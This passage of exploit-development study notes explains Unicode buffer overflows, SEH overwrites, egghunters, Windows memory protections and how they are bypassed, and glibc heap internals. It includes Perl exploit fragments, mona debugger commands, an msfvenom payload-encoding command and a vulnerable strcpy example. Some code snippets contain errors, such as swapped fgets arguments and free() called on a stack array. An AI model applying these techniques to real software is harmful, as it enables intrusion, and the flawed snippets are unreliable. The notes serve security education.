            -   The main drawback of ANSI is the use of many code pages, depending on the language that is being used; there's one for English (known as West European Latin), Greek, Turkish, Hebrew, Arabic, and many others. There is no problem when all the computers who access the data use the same code page, but when different code pages are in use, the data read would not be the same as the data written. This could result in data corruption and even program crashes in certain scenarios. So, unicode allows us to visually represent and/or manipulate text in most of the systems across the world in a consistent manner.  So applications can be used across the globe, without having to worry about how text will look like when displayed on a computer -- almost any computer -- in another part of the world.

            -   The reason why ANSI cannot accommodate is it uses only 8 bits to represent every code point. This width is fixed and only has a total of 256 different combinations. In comparison, Unicode uses a maximum of 32 bits for each code point; used in fixed width in UTF-32. So it can supports many languages not like ansi encoding But because using four bytes for each character is such a huge waste of space, variable width encoding is employed in UTF-8 and UTF-16 to save space.

            -   Because Unicode is a newer standard, it is expected that older operating systems may not support it. Even though the code points of UTF-8 and ANSI are pretty much identical, older operating systems like Windows 95 cannot work with it. Therefore, programs that use Unicode would not be able to run properly on these operating systems. With respect to the opposite, or running ANSI coded programs on newer operating systems, it is possible as there are mechanisms to convert between ANSI and Unicode. Just keep in mind that the conversion adds a bit of processing overhead

            -   So far so good -- having a unified way to represent characters is nice... but why is a lot of stuff still in ASCII ? Well, most applications that work with strings, use a null byte as string terminator.  So if you would try to stuff unicode data into an ASCII string, the string would be ended right away...  So this is why for example plain text applications (such as smtp, pop3, etc) still use ASCII for setting up communications.  (OK, the payload can be encoded and can use unicode, but the transport application itself uses ASCII).

        -   ### 1-introduction to unicode BOF

            -   You may (or may not) have encountered a situation where you've performed a stack buffer overflow, overwriting either a RET address or a SEH  record, but instead of seeing 0x41414141 in EIP, you got 0x00410041.

            -   Sometimes, when data is used in a function, some manipulations are applied. Sometimes data is converted to uppercase, to lowercase, etc...  In some situations data gets converted to unicode.  When you see 0x00410041 in EIP, in a lot of cases, this probably means that your payload had been converted to unicode before it was put on the stack

            -   Quite often, the strings we enter as input to an application are internally represented as (or converted to) Unicode (aka "Wide") strings. While this may be transparent to the standard application user, it means our input is converted from its single-byte, code-page representation to a two-byte Unicode value.this can be done by MultiByteToWideChar() api which maps a character string to a wide-character unicode string :

                -   int MultiByteToWideChar(

                -   UINT CodePage,

                -   DWORD dwFlags,

                -   LPCSTR lpMultiByteStr,

                -   int cbMultiByte,

                -   LPWSTR lpWideCharStr,

                -   int cchWideChar

                -   );

            -   If you convert ASCII text into Unicode (code page ansi), then the result will look like as if "00" is added before every byte.  So AAAA (41 41 41 41) would now look like 0041 0041 0041 0041.  Of course, this is just the result of a conversion from data to wide char data

        -   ### What is the result of unicode conversion / impact on our exploit?

            -   Let's say if you had the following shellcode:  \\x41\\x42\\x43 If that shellcode were to be translated to Unicode at the time of the overflow, it would look as follows: \\x41\\x00\\x42\\x00\\x43\\x00.

            -   With Unicode, you only control 2 out of these 4 bytes (the other 2 are most likely going to be nulls... so in a way, you control those nulls too)

            -   When an input string is converted to ansi unicode, for all characters between 0x00 and 0x7f, a null byte is prepended. Furthermore, a lot of characters above 0x7f are translated into 2 bytes, and these 2 bytes may not necessarily contain the original byte. This breaks everything we have learned about exploits and shellcode so far. In all previous tutorials, we attempt to overwrite EIP with 4 bytes (excluding intentionally partial overwrites).

            -   Furthermore, the available instruction set (used for jumping, for shellcode, etc) becomes limited.  After all, a null byte is placed before most bytes.  And on top of that, other bytes (\> 0x7f) are just converted to something entirely different.

            -   Even simple things such as a bunch of nops (0×90) becomes a problem.  The first nop may work. The second nop will (due to alignment) becomes instruction 0090 (or 009000)... and that's not a nop anymore

        -   ### EIP is 0x00410041. Now what ?

            -   In the previous tutorials, we have discussed 2 types of exploits: direct RET overwrite or SEH overwrites.  These 2 types of overwrites are, of course, still valid with unicode exploits.  In a typical stack based overflow, you will either overwrite RET with 4 bytes (but due to Unicode, only 2 bytes are under your control), or you a overwrite the Structured Exception Handler record fields (next SEH and SE Handler) each with 4 bytes, again out of which only 2 are under your control.

            -   How can we still abuse this to get EIP do what we need it to do ?  The answer is simple : overwrite the 2 bytes at EIP with something useful.

        -   ### 2-overwriting Eip: direct overwriting

            -   The global idea behind "jumping to your shellcode" when owning EIP is still the same, whether this is an ASCII or unicode buffer overflow. In the case of a direct EIP overwrite, you will need to find a pointer to an instruction (or series of instructions) that will take you to your shellcode, and you need to overwrite EIP with that pointer.  So you need to find a register that points to your buffer (even if it contains null bytes between every character -- no need to worry about this yet), and you will need to jump to that register.

            -   The only problem is the fact that you cannot just take any address.  The address you need to look for needs to be 'formatted' in such a way that, if the 00's are added, the address is still valid. So essentially, this leaves us only with 2 options :

                -   Find an address that points to your jump/call/... instruction, and that looks like this:  0x00nn00mm.  So if you overwrite RET with 0xnn,0xmm  it would become 00nn00mm and This address does not contain characters that have a hex value \> 7f

                -   Or, alternatively, if you cannot find such an address Find an address that is also formatted 0x00nn00mm, and close to the call/jump/... instruction that you want to execute. Verify that the instructions between the address and the actual call/jump address will not harm your stack/registers, and use that address. This address does not contain characters that have a hex value \> 7f

            -   Basically, we are looking for addresses that contain null bytes in the right place. If EIP contains 0x00nn00mm, then you must find an address with the same format.  If EIP contains 0xnn00mm00, then you must find an address with this format. In the past, we have always tried to avoid null bytes because it acts as a string terminator.  This time we need addresses with null bytes.  We don't need to worry about string termination because we are not going to put the null bytes in the string that is sent to the application.  The unicode conversion will insert the null bytes for us automagically.

            -   Let's assume you have found an address that will make the jump. Let's say the address is 0x005E0018. This address does not contain characters that have a hex value \> 7f.  So the address should work.

            -   I assume you have figured out after how many bytes you will overwrite saved EIP.  (You may able to use a metasploit pattern for this, but you'll have to look at the bytes before and after overwriting EIP, in order to get at least 4 characters).  I'll show an example on how to do the match later on in this tutorial.

                -   Suppose you overwrite EIP after sending 500 A's. And you want to overwrite EIP with "jump eax (at 0x005e0018)" (because EAX points to the A's), then your script should look like this :

                    -   my \$junk=\"A\" x 500;

                    -   my \$ret=\"\\x18\\x5e\";

                    -   my \$payload=\$junk.\$ret;
    
                -   So instead of overwriting EIP with pack('V',0x005E0018), you overwrite EIP with  5E 18. Unicode adds null bytes in front of 5E, and between 5E and 18, so EIP will be overwritten with 005e0018 (The string-to-widechar conversion took care of adding the nulls right were we wanted them to be.  Step 1 accomplished.)

        -   ### Unicode SEH based overwrite**

            -   **Overwrite SEH**

                -   Let's start with the SEH overwrite We need To find a Unicode-friendly POP+POP+RET address with the first and third bytes are nulls and that does not contain bytes \> 7f, we can use mona (!mona seh -cp unicode)

                -   Or run (!pvefindaddr p2) this will write output to the log, and also to a file called ppr2.txt. Open the file and look for "Unicode" you will find all pop/pop/ret combinations in the entire process memory space, This process can take a long time, so be patient. If you can find an entry, that does not contain bytes \> 7f, because other bytes (\> 0x7f) are just converted to something entirely different then you can try to overwrite SEh with this address

            -   **Overwrite NSEH**

                -   In a typical SEH based exploit, we overwrite nseh with a jmp instruction to jump to the shellcode.  Now, instead of writing jumpcode at nseh (which will be almost impossible to do), we will use instructions that simulates a short jump. we can just "walk" to the shellcode

                -   we need 2 things :

                    -   A couple of instructions that will, when executed, not cause any harm. We need to put these instructions in nSEH   and

                    -   The unicode compatible address used to overwrite SE Handler must, when executed as instructions, not cause any harm either.

                -   Overwrite nseh with x61x62\"; \#nseh -\> popad + nop/align

        -   ### 3-generate a unicode friendly shellcode**

            -   Now we know what to put in EIP. But if you look at your ASCII shellcode: it will also contain null bytes and, if it was using instructions (opcodes) above 0x7f, the instructions may have even changed.  How can we make this work?  Is there a way to convert ASCII shellcode (just like the ones that are generated with metasploit) into unicode compatible shellcode?  Or do we need to write our own stuff?  We're about to find out.

            -   Ok, we know that the shellcode generated in metasploit (or written yourself) will not work.  If the shellcode was not written specifically for unicode, it will fail. (Null bytes are inserted, opcodes are changed, etc). Fortunately, a couple of smart people have built some tools (based on the concept of Venetian shellcode) that will solve this issue.  (Dave Aitel, FX and Skylined).In essence, it boils down to this: You need to encode the ASCII shellcode into unicode-compatible code, prepend it with a decoder (also unicode-compatible). Then, when the decoder is executed, it will decode the original code and execute it.

            -   There are 2 main ways to do this:

                -   either by reproducing the original code in a separate memory location, and then jump to that location,

                    -   This technique will require 2 things: one of the registers must point at the beginning of the decoder+shellcode, and one register must point at a memory location that is writeable (and where it's ok to write the new reassembled shellcode). 

                -   Or by changing the code "in-line" and then running the reproduced shellcode. 

                    -   This technique only requires one of the registers to point at the beginning of the decoder+shellcode, and the original shellcode will be reassembled in-place.

            -   Technique 1 : Find an ASCII equivalent & jump to it

            -   Technique 2 : Write your own unicode-compatible shellcode from scratch

            -   Technique 3 : Use a decoder

                -   Msfvenom

                    -   msfvenom -a x86 -p windows/exec cmd=calc.exe -e x86/unicode\_upper BufferRegister=EAX EXITFUNC=thread

        -   ### Final payload

            -   payload = junk +nseh+seh+ventian code+nop+shellcode

            -   ![seh](images/unicode_seh.jpeg)

    -   ## Egghunter

        -   ### introduction

            -   To execute arbitrary code, an attacker puts his shellcode in the available buffer space. What if, the shellcode requires more space than the available space in the buffer? This is where the egg hunter technique is useful. Egg hunter is a small piece of shellcode which searches for an actual bigger shellcode which the attacker was not able to fit-in the available buffer space and redirect execution flow to it.

            -   we'll use the minimal buffer space (reachable by our EIP overwrite) to host a small payload that does nothing more than search memory for the shellcode and jump to it. So the egghunter technique divides our shellcode into 2 parts:

                -   Egghunter : small code that only function is to search for the egg in all memory

                -   egg = marker + final shellcod

            -   There are two basic pre-requisites to be able to use the Egghunter technique.

                -   First, you must have a minimum amount of predictable memory to which you can jump that holds the small Egghunter code.

                -   Second, your shellcode must be available in its entirety somewhere in memory (on the stack or heap)

            -   Here's how it works: 

                -   Prepend your shellcode with an 8-byte tag (the "egg").

                -   Use the EIP overwrite to jump to a predictable location that holds a small Assembly language routine (the "Egghunter") which searchers memory for the "egg" and, when found, jumps to it to execute the shellcode.

            -   The egg hunter code searches for a "EGG" .The egg will be a 4 byte string, repeated once. Let's say our string is "PWND", the egg we will prepend to our shellcode will be PWNDPWND. The "EGG" is placed just before the "Shellcode" and the egg hunter code is placed in the small available buffer space while exploiting the overflows. The reason for the repetition is to ensure that when we locate it in memory, we can verify we've actually found our shellcode (and not a random collection of 4 bytes, or the Egghunter routine itself) --- it's simply a way to double check we've reached our shellcode.

        -   ### There are quite a few egg hunter technique for Win32 and Linux applications such as :

            -   **For linux**

                -   access(2) -- 39 bytes

                -   access(2) revisited -- 35 bytes

                -   sigaction(2) -- 30 bytes

            -   **For Windows**

                -   Structured Exception Handling (SEH) -- 60 bytes

                -   Using syscall

                    -   IsBadReadPtr -- 37 bytes

                    -   NTAccessCheckAndAuditAlarm -- 32 bytes

                -   NtAccessCheckAndAuditAlarm, not NtDisplayString. Both of them function in same way, the only difference is syscall number

        -   ### Egghunter Exploitation

            -   Basic mechanism of exploiting a stack overflow using egg hunter: When stack overflow occurs at some point it overwrites the EIP register (EIP points to next instruction to be executed). Then we should make EIP point to ESP where our shellcode will be present. In some cases shellcode might be just above the ESP, in that case we need jump back and execute shellcode which is egg hunter in this case, which searches for "EGG" in the entire memory and executes actual shellcode which is next "EGG".

            -   if we need jump backwards because the buffer space isn't even enough for our egghunter we the. We can use the opcode xeb\\ which is used in case of. Backward Short JMP or forward Short JMP and it will jump backwards or forwards depending on the number used after it

            ![backward jmp](images/egghunter_backwardjmp.jpeg)

        -   ### Exploitation steps:

            -   fuzz the app

            -   Create a pattern to know the Eip location with mona plugin.

                -   !mona pattern\_create \[nb\]

                -   the pattern will be found in C:\\Program Files\\Immunity Inc\\Immunity Debugger\\pattern.txt

                -   Determine the offset that overwrite the eip with

                    -   !mona findsmp.

                -   The result of that command will be found in C:\\Program Files\\Immunity Inc\\Immunity Debugger\\findmsp.txt

            -   Try to find an address for jmp esp and place it in Eip offset we have 2 ways to do that but we will use mona plugin command:

                -   mona jmp -r esp!

            -   After that the cpu will execute what's in the Eip which is the jmp esp instruction so now we need to to put our egghunter code inside esp (note that the size of esp is very small)

        -   ### Overcoming Corrupted Shellcode

            -   If we have a scenario that calls for the use of an Egghunter but successful exploit is being hindered by the presence of multiple, corrupted copies of our shellcode we could:

                -   Change the offset to the shellcode

                -   Change the starting memory page of the Egghunter search 

                -   Split the shellcode into smaller pieces ("Omelette" Egghunter) The idea behind the Omelette Egghunter is to break up your shellcode into multiple chunks, each prefaced with its own egg as well as an additional tag that contains two pieces of information: 1) an indicator as to whether it is the last chunk of shellcode and 2) the length of the shellcode chunk

                -   Add some additional error checking to our Egghunter ("Egg Sandwich" Egghunter)

        -   ### Resources

            -   https://www.secpod.com/blog/hunting-the-egg-egg-hunter/

            -   http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

-   # Memory security mechanisms

    -   The success of all of the previous exploits (whether they are based on direct ret overwrite or exception handler structure overwrites) are based on the fact that a reliable return address or pop/pop/ret address must be found, making the application jump to your shellcode. In all of these cases, we were able to find a more or less reliable address in one of the OS dll's or application dll's. Even after a reboot, this address stays the same, making the exploit work reliably. Fortunately for the zillions Windows end-users out there, a number of protection mechanisms have been built-in into the Windows Operating systems.

    -   ## Stack cookies (/GS Switch cookie)

        -   The /GS switch is a compiler option that will add some code to function's prologue and epilogue code in order to prevent successful abuse of typical stack based (string buffer) overflows.

        -   When an application starts, a program-wide master cookie (4 bytes (dword), unsigned int) is calculated (pseudo-random number) and saved in the .data section of the loaded module. In the function prologue, this program-wide master cookie is copied to the stack, right before the saved EBP and EIP. (between the local variables and the return addresses)

        -   \[buffer\]\[cookie\]\[saved EBP\]\[saved EIP\]

        -   During the epilogue, this cookie is compared again with the program-wide master cookie. If it is different, it concludes that corruption has occurred, and the program is terminated.

        -   The second important protection mechanism of /GS is variable reordering. In order to prevent attackers from overwriting local variables or arguments used by the function, the compiler will rearrange the layout of the stack frame, and will put string buffers at a higher address than all other variables. So when a string buffer overflow occurs, it cannot overwrite any other local variables.

        -   The stack cookie is often referred to as "canary" as well.

    -   ## Safeseh (/Safeseh compiler switch)

        -   Safeseh is yet another security mechanism that helps blocking the abuse of SEH based exploitation at runtime. It is as compiler switch (/safeSEH) that can be applied to all executable modules (so .exe files, .dll's etc)

        -   Instead of protection the stack (by putting a cookie before the return address), modules compiled with this flag will include a list of all known addresses that can be used as exception handler functions.  If an exception occurs, the application will check if the address in the SEH chain records belongs to the list with \"known\" functions, if the address belongs to a module that was compiled with safeseh. If that is not the case, the application will be terminated without jumping to the corrupted handler. The Microsoft implementation of the safeseh technique is (as of now) pretty stable and pretty much all Operating System modules are compiled with this flag.

    -   ## Data Execution Prevention (DEP) (software and hardware based)

        -   **DEP** is a set of hardware and software technologies that perform additional checks on memory to help prevent malicious code from running on a system. The primary benefit of DEP is to help prevent code execution from data pages by raising an exception when such attempts are made. 

        -   we can bypass DEP by Return Oriented Programing (ROP)

    -   ## Address Space Layout Randomization (ASLR)

        -   Address space layout randomization (ASLR) is a memory protection techniques that tries to prevent an attacker from creating a reliable exploit. What it does is simple, randomizes the base addresses of loaded applications and DLLs every time the operating system is booted. On older Windows operating systems like Windows XP where ASLR is not implemented, all DLLs are loaded at the same memory address every time, making exploitation much simpler. When coupled with DEP, ASLR provides a very strong mitigation against exploitation It also randomizes the base addresses for memory segments like the heap and the stack. This makes it harder for attackers to guess the correct address.

        -   IN linux el memory addresses beteghayar kol lama nefta7 el program mara tania in windows el memory addresses beteghayar kol lama n3mel rebout

        -   an address is composed of 4 bytes (1 word) ex : 23fg 5489 high bytes= 23fg low bytes = 5489    el 2 bytes elli 3ala shemal are called high bytes w elli 2 elli 3ala el yemin called low bytes

        -   aslr in windows change only the high bytes every reboot but the low bytes remains the same 

        -   A way to see this taking place is by attaching an executable supporting ASLR (WinRAR in example below). Attach it to OllyDbg and go to the memory tab (ALT+M). notice the higher two bytes  Restart WinRAR

        -   Example: A JMP ESP instruction is located at 0x12345678 in test.dll, upon restart, address is now located at 0xABCD5678.

        -   ![aslr 1](images/aslr_1.jpeg)![aslr 2](images/aslr_2.jpeg)

        -   ###  Bypassing ASLR

            -   Next I'll discuss 4 (more like 3) techniques on bypassing ASLR, each with pros, cons and study cases if any.

            -   **1. Abusing non-ASLR enabled libraries**

                -   Programmers make mistakes, to make full use of ASLR, all loaded libraries need to be supporting it. If a single module doesn't you can make use of it by finding search that library for the needed instruction to jump to your shellcode.

            -   **2. Partial EIP overwrite**

                -   Since you control EIP, you also control how much of EIP you want to overwrite. As already mentioned, ASLR only randomizes the higher two bytes, what if you can make use of that and only overwrite the lower 2 bytes?

                -   Example: DLL is loaded at 0xAABB0000, if you overwrite only the lower two bytes (thanks to small endianness) you can basically control EIP to jump anywhere in 0xAABB0000 to 0xAABBXXY.

            -   **2.1 Single byte overwrite**

                -   Sometimes a character gets appended to your string, for example a null byte. This will mess up with the previous technique as when you try to overwrite the lower 2 bytes of EIP it becomes 0xAA00XXYY instead of 0xAABBXXYY.

                -   Although this limits the possibility of finding a proper instruction, you might still be able to get away with a single byte.

                -   Search in 0xAABB0000 to 0xAABB00FF for possible instructions that can be used to land you your shellcode. 256 combinations aren't a lot so good luck with that.

            -   ### Bruteforcing address space

                -   Since we know that only the 2 higher bytes are randomized, what if we try to bruteforce all the possible combination? This method is risky (might crash the service), slow and adds a lot of overhead.

    -   ## Control Flow Guard [CFG]

        -   Control Flow Guard is a Microsoft's implementation of control-flow integrity, performs validation of indirect code branching, preventing overwrites of function pointers

    -   ## Rebasing

        -   I used an address from a "rebased" application module (DLL). Without going into too much detail about rebasing, understand that every module has a designated base address at which it is supposed to load (and compilers often have a default address that they assign to all modules). If there is an address conflict at load time, the OS must rebase one of the modules (very costly from a performance perspective). Alternatively, an application developer may rebase a module ahead of time in an attempt to avoid such conflicts. In our case, if MSA2Mcodec00.dll is rebased, the address space changes and as a result, our CALL EBX address changes. Unfortunately, this impacts the reliability of successful exploit even more so than our EIP offset problem. Here we have two choices ---

            -   1\) see if we can find another application module that doesn't implement rebasing (preferred) or

            -   2\) use an OS module. Remember from part 2, the drawback of using an OS DLL (vs an application DLL) is that it reduces the likelihood the exploit will work across different versions of Windows. That being said, an exploit that works on every Windows XP machine is better than an exploit that only works on one machine

        -   We can use the mona plugin to examine the loaded modules more closely and see which ones implement rebasing by running the following command:

            -   !mona find -type instr -s \"call ebx\"

    -   ## Resources

        -   https://elearnhacking.wordpress.com/2014/09/21/tutorial-2-stack-based-overflow-exploit-jumping-to-shellcode/

-   # Heap based overflow :

    -   ## what is heap

        -   heap is  dynamic memory allocation and stack is automatic memory allocation

    -   ## How to allocate space in Heap

        -   ### C language

            -   **Functions used to allocate space in Heap**

                -   malloc() grabs memory on the heap  

                -   calloc()

                -   realoc() 

                -   free() releases memory on the heap

            -   ### Malloc() = memory allocation

                -   Allocates single block of requested memory.

                -   Syntax :

                    -   ptr = (cast-type\*) malloc(byte-size)

                -   ptr = (int\*) malloc(100 \* sizeof(int));

                    -   Since the size of int is 4 bytes, this statement will allocate 400 bytes of memory. And, the pointer ptr holds the address of the first byte in the allocated me

                -   If space is insufficient, allocation fails and returns a NULL pointer.

                    -   if(ptr==NULL)  {                     

                    -      printf(\"Sorry! unable to allocate memory\");    

                    -      exit(0);  }

                -   ![malloc](images/heap_overflow/malloc.jpeg)

            -   ### Calloc() = contiguous allocation

                -   Allocates multiple block of requested memory.

                -   Syntax :

                    -   ptr = (cast-type\*)calloc(n, element-size);

                -   ptr = (float\*) calloc(25, sizeof(float));

                    -   This statement allocates contiguous space in memory for 25 elements each with the size of the float.

                -   ![calloc](images/heap_overflow/calloc.jpeg)

            -   ### Realoc()

                -   Syntax

                    -   ptr = realloc(ptr, newSize);

                        -   where ptr is reallocated with new size \'newSize\'

                -   "Re-allocation" method in C is used to dynamically change the memory allocation of a previously allocated memory. In other words, if the memory previously allocated with the help of malloc or calloc is insufficient, realloc can be used to dynamically re-allocate memory. re-allocation of memory maintains the already present value and new blocks will be initialized with default garbage value

                -   ![Realloc](images/heap_overflow/Realloc.jpeg)

            -   ### Heap implementation

                -   there are tons of heap implementations 

                    -   dlmalloc -- General purpose allocator

                    -   ptmalloc2 -- glibc

                    -   jemalloc -- FreeBSD and Firefox

                    -   tcmalloc -- Google

                    -   libumem -- Solaris

                -   glibc 2.19 is what we have on the Warzone

                    -   Default for Ubuntu 14.04 (32bit)

                    -   Its heap implementation is based on ptmalloc2

                    -   Very fast, low fragmentation, thread safe

                -   malloc is a function in the C standard library (and also in the C++ standard library).that are invoked in linux by Syscalls either brk or mmap syscall to obtain memory and are invoked by windows api by HeapAlloc() / HeapFree() functions

            -   **Example**

                -   ex: int  \*p = (int \*)malloc(sizeof(int))         //reserve 4 bytes in heap

                -    \*p = 5                                                  //any value

                -     free(p)                                                  //memory deallocation

            -   **Example 2**

                -   char name\[10\] = \"my name\";

                -   char \*p = (char\*)malloc(sizeof(char) \* 10 )       

                    -    //sizeof(char ) reserve the size of bytes of  a char variable incase i dont know its 1 bytes \* 10 nb of bytes i reserved for name variable

                    -    //any value

                -     free(name)            //memory deallocation

            -   **Simple program**

                -   int main() { 

                -        char \* buffer ;

                -   /\* allocate a 0x100 byte buffer \*/ 

                -         buffer = malloc(0x100);

                -   /\* read input and print it \*/ 

                -         fgets(stdin, buffer, 0x100); 

                -         printf("Hello %s!\\n", buffer);

                -   /\* destroy our dynamically allocated buffer \*/ 

                -          free(buffer); 

                -   return 0; }

                -   

        -   ### C++ language

            -   **Functions used to allocate space in Heap**

                -   New

                -   Delete

            -   **Wrong way for memory allocation**

                -   (new int = 7)   //false because i cant get that value in heap i must make  a pointer that points to that variable  new make 2 things {allocate memory and return address so we need a pointer to   store that address}

            -   **right way for memory allocation**

                -   int \* p= new int        //i have made a pointer that points to the address of my variable in heap with value 6

                -   \*p=6               

                    -   //p -\>in stack     int -\>in heap   ; int doesn't have a name so to reach it we reach it by its address 

                -   delete p       

                    -   //every time i reserve a place from heap i must delete it 

    -   ## Heap Internals

        -   ### heap manager

            -   A heap memory manager is responsible for the management of heap memory.

            -   The heap memory manager performs the following fundamental memory operations:

                -   Allocation - performed by malloc and calloc

                -   Deallocation - performed by free

                -   Reallocation - performed by realloc

        -   ### heap chunks

            -   Suppose a programmer asks for, say, 10 bytes of memory via malloc. To service this request, the heap manager needs to do more than just find a random 10 byte region that the programmer can write to. The heap manager also needs to store metadata about the allocation. This metadata is stored alongside the 10-byte region that the programmer can use. This allocation metadata and alignment-padding bytes is stored alongside the region of memory that malloc will give back to the programmer. For this reason, the heap manager internally allocates "chunks" of memory that are slightly bigger than the programmer initially asked for. When the programmer asks for 10 bytes of memory, the heap manager finds or creates a new chunk of memory that is big enough to store the 10-byte space plus the metadata and alignment padding bytes. The heap manager then marks this chunk as "allocated", and returns a pointer to the aligned 10-byte "user data" region inside the chunk, which the programmer sees as the return value of the malloc call.

            -   The heap implementation divides the heap into manageable chunks and tracks which heaps are free and in use. Each chunk contains a header structure and free space (the buffer in which data is placed). The header structure contains information about the size of the chunk and the size of the preceding chunk

            -   ![heap chunk](images/heap_overflow/Heap_chunk.jpeg)

            -   Since all chunks are multiples of 8 bytes, the 3 LSBs of the chunk size can be used for flags. These three flags are defined as follows:

                -   **A (0x04) :** Allocated Arena - the main arena uses the application\'s heap. Other arenas use mmap\'d heaps. To map a chunk to a heap, you need to know which case applies. If this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap\'d memory and the location of the heap can be computed from the chunk\'s address.

                -   **M (0x02) :** MMap\'d chunk - this chunk was allocated with a single call to mmap and is not part of a heap at all.

                -   **P (0x01) :**P revious chunk is in use - if set, the previous chunk is still being used by the application, and thus the prev\_size field is invalid

                -   ![allocated](images/heap_overflow/allocated_chunk.jpeg)

        -   ### Free chunk vs Allocated chunk

            -   ![free vs allocated](images/heap_overflow/free_vs_allocated_chunk.jpeg)

            -   **Allocated chunk structure**

                -   The size of the previous chunk, The size of the previous chunk is stored in the current chunk **if the previous chunk is free. (**4-byte values)

                -   Size of current chunck ( 4-byte values )

                -   Data

                -   ![allocated ](images/heap_overflow/allocated.jpeg)

            -   **Unallocated chunk structure (Freed)**

                -   prev\_size:The size of the previous chunk, The size of the previous chunk is stored in the current chunk **if the previous chunk is free.**

                -   size: This field contains the size of this free chunk.

                -   fd: Forward pointer -- Points to next chunk in the same bin (and NOT to the next chunk present in physical memory).

                -   bk: Backward pointer -- Points to previous chunk in the same bin (and NOT to the previous chunk present in physical memory).

                    -   These pointers are part of a doubly-linked list (forwards and backwards), which are used to consolidate unallocated heap chunks when they are free()ed. free() will remove the chunk from the linked list via the unlink() function

                -   Data

                -   ![free chunk](images/heap_overflow/freed_chunk.jpeg)

            -   ### Malloc implementation

                -   struct malloc\_chunk {

                -   INTERNAL\_SIZE\_T prev\_size; /\* Size of previous chunk (if free). \*/

                -   INTERNAL\_SIZE\_T size; /\* Size in bytes, including overhead. \*/

                -   struct malloc\_chunk\* fd; /\* double links \-- used only if free. \*/

                -   struct malloc\_chunk\* bk;

                -   /\* Only used for large blocks: pointer to next larger size. \*/

                -   struct malloc\_chunk\* fd\_nextsize; /\* double links \-- used only if free. \*/

                -   struct malloc\_chunk\* bk\_nextsize;

                -   };

        -   ### So how does the heap manager internally allocate these chunks?

            -   If there is a previously-freed chunk of memory, and that chunk is big enough to service the request, the heap manager will use that freed chunk for the new allocation.

            -   Otherwise, if there is available space at the top of the heap, the heap manager will allocate a new chunk out of that available space and use that.

            -   Otherwise, the heap manager will ask the kernel to add new memory to the end of the heap, and then allocates a new chunk from this newly allocated space.

            -   If all these strategies fail, the allocation can't be serviced, and malloc returns NULL.

        -   ### mmap

            -   Very large allocation requests\* get special treatment in the heap manager. These large chunks are allocated off-heap using a direct call to mmap, and this fact is marked using a flag in the chunk metadata. When these huge allocations are later returned to the heap manager via a call to free, the heap manager releases the entire mmaped region back to the system via munmap.

            -   By default this threshold is 128KB up to 512KB on 32-bit systems and 32MB on 64-bit systems, however this threshold can also dynamically increase if the heap manager detects that these large allocations are being used transiently.

        -   ### arenas:

            -   In order to efficiently handle multi-threaded applications, glibc\'s malloc allows for more than one region of memory to be active at a time. Thus, different threads can access different regions of memory without interfering with each other. These regions of memory are collectively called \"arenas\". There is one arena, the \"main arena\", that corresponds to the application\'s initial heap. There\'s a static variable in the malloc code that points to this arena, and each arena has a next pointer to link additional arenas. As pressure from thread collisions increases, additional arenas are created via mmap to relieve the pressure. With each new thread that joins the process, the heap manager tries to find an arena that no other thread is using and attaches the arena to that thread. Once all available arenas are in use by other threads, the heap manager creates a new one, up to the maximum number of arenas there could  be 0 to( 2x cpu-cores )in 32-bit processes and (8x cpu-cores )in 64-bit processes. Once that limit is finally reached, the heap manager gives up and multiple threads will have to share an arena and run the risk that performing heap operations will require one of those threads to wait for the other.

            -   Arena is the top level memory management entity. There are two types of arenas. Main arena covers the traditional heap area: the space between start\_brk and brk for a process from kernel point of view, only one main arena exists for a process.  Non-main arena manages the memory fetched from kernel via mmap() system call, 

            -   Each arena is essentially an entirely different heap that manages its own chunk allocation and free bins completely separately. Each arena still serializes access to its own internal data structures with a mutex, but threads can safely perform heap operations without stalling each other so long as they are interacting with different arenas.

            -   The initial ("main") arena of the program only contains the heap we've already seen, and for single-threaded applications this is the only arena that the heap manager will ever use. However, as new threads join the process, the heap manager allocates and attaches secondary arenas to each new thread in an attempt to reduce the chance that the thread will have to wait around waiting for other thread when it attempts to perform heap operations like malloc and free.

        -   ### Sub heap:

            -   But wait a minute! How do these secondary arenas even work? Before we saw that the main heap is located just after where the program is loaded into memory and is expanded using the brk system call, but this can't also be true for secondary arenas!

            -   The answer is that these secondary arenas emulate the behavior of the main heap using one or more "subheaps" created using mmap and mprotect.

            -   For non-main arena, each time it gets memory from kernel in block of 1M bytes on 32bit system (HEAP\_MAX\_SIZE), and the block is called sub heap. Note that one non-main arena could have many number of sub heaps.

            -   By default, the maximum size of a subheap--and therefore the region of memory reserved for the subheap to grow into--is 1MB on 32-bit processes and 64MB on 64-bit systems.

            -   \- To recap: the initial ("main") arena contains only the main heap which lives just after the where the program binary is loaded into memory, and is expanded using sbrk. This is the only arena that is used for single-threaded applications. On multithreaded applications, new threads are given secondary arenas from which to allocate. Using arenas speeds up the program by reducing the likelihood that a thread will need to wait on a mutex before being able to perform a heap operation. Unlike the main arena, these secondary arenas allocate chunks from one or more subheaps, whose location in memory is first established using mmap, and which grow by using mprotect.Unlinking a chunk

        -   ### Bins and Chunks

            -   Details of free chunks are stored in a doubly linked list. In the list, there is a forward pointer to the next free chunk (fd) and a backward pointer to the previous free chunk (bk). These pointers are placed in the unused chunk itself. The minimum size of a chunk is always 16 bytes, so there is enough space for the two pointers and two size integers.

            -   A bin is a list (doubly or singly linked list) of free (non-allocated) chunks. Bins are differentiated based on the size of chunks they contain:

                -   1\. Fast bin

                -   2\. Unsorted bin

                -   3\. Small bin

                -   4\. Large bin

        -   ### Heap Fragmentation

            -   Memory on the heap is allocated, deallocated, and resized regularly during program execution, and this can lead to a problem called fragmentation. Fragmentation occurs when memory objects are allocated with small spaces in between that are too small to hold additional memory objects. The net result is a percentage of the heap space that is not usable for further memory allocations\\

        -   ### Security mitigation

            -   ![mitigations](images/heap_overflow/mitigations.jpeg)

    -   ## Heap Exploitation :

        -   Heap Overflows 

        -   Use After Free 

        -   Heap Spraying 

        -   Metadata Corruption

    -   ## Heap Overflow

        -   it occurs when data is written outside the space that was allocated for it on the heap.

        -   **vulnerable c code**

            -   \#define BUFSIZE 256

            -   int main(int argc, char \*\*argv) {

            -   char \*buf;

            -   buf = (char \*)malloc(sizeof(char)\*BUFSIZE);

            -   strcpy(buf, argv\[1\]);

            -   }

    -   ## Use After Free (UAF)

